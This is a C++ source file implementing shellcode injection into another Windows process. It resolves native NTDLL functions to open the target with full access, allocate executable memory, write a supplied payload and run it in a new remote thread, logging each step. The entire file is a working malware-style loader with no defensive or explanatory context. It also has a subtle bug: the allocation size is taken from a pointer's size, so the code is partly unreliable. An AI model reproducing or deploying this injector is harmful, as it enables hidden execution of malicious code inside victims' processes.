#include "NTtools.h"
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)



bool NT_injection(_In_ const char* process_id, _In_ const unsigned char* payload, _In_ SIZE_T payload_size) {
	DWORD PID=0;
	HANDLE hProcess, hThread = NULL;
	LPVOID rBuffer = NULL;
	HMODULE hNTDLL = NULL;
	NTSTATUS STATUS = NULL;
	

	using std::cout;
	using std::endl;
	
	
	
	PID = atoi(process_id);
	hNTDLL = GetModuleHandleW(L"NTDLL.dll");
	if (hNTDLL == NULL) {
		cout << "failed to get module handle on NTDLL, error:" << GetLastError() << endl;
		return false;
	}
	OBJECT_ATTRIBUTES OA = { sizeof(OA),NULL };
	CLIENT_ID CID = { (HANDLE)PID,NULL };

	cout << "populating function prototypes" << endl;
	NtOpenProcess nt_Open = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	NtAllocateVirtualMemory nt_malloc = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory nt_Memwrite = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
	NtCreateThreadEx nt_Thread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
	NtClose nt_Close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
	NtWaitForSingleObject nt_wait = (NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
	if (!nt_Open || !nt_malloc || !nt_Memwrite || !nt_Thread || !nt_Close) {
		cout << "Failed to populate NT function pointers." << endl;
		return false;
	}
	cout << "finished, starting injection" << endl;

	STATUS = nt_Open(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to get handle on process, error:" << std::hex<<STATUS << endl;
		nt_Close(hProcess);
		return false;
	}
	cout << "got a handle on process" << endl;

	SIZE_T sc = sizeof(payload);
	
	STATUS = nt_malloc(hProcess, &rBuffer,0,&sc,(MEM_COMMIT|MEM_RESERVE),PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to alloc mem, error:" <<std::hex<< STATUS << endl;
		nt_Close(hProcess);
		return false;
	}
	cout << "virtual mem allocated,\n rBuffer: "<<rBuffer<<" \nshellcode size: "<<sc << endl;

	STATUS = nt_Memwrite(hProcess, rBuffer, (PVOID)payload,payload_size,NULL);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to write mem, error:" << std::hex<<STATUS << endl;
		cout << "size of shellcode, " << sc << endl;
		cout << " size of original shellcode " << payload_size << endl;
		nt_Close(hProcess);
		return false;
	}
	cout << "wrote in process memory" << endl;

	STATUS = nt_Thread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to make thread, error " << std::hex<<STATUS << endl;
		nt_Close(hThread);
		nt_Close(hProcess);
		return false;
	}
	cout << "got handle to thread , waiting for object to finish executing" << endl;

	nt_wait(hThread, FALSE, NULL);
	cout << "thread finished execution" << endl;

	nt_Close(hThread);
	nt_Close(hProcess);
	cout << "finished cleanup" << endl;
	return true;

}

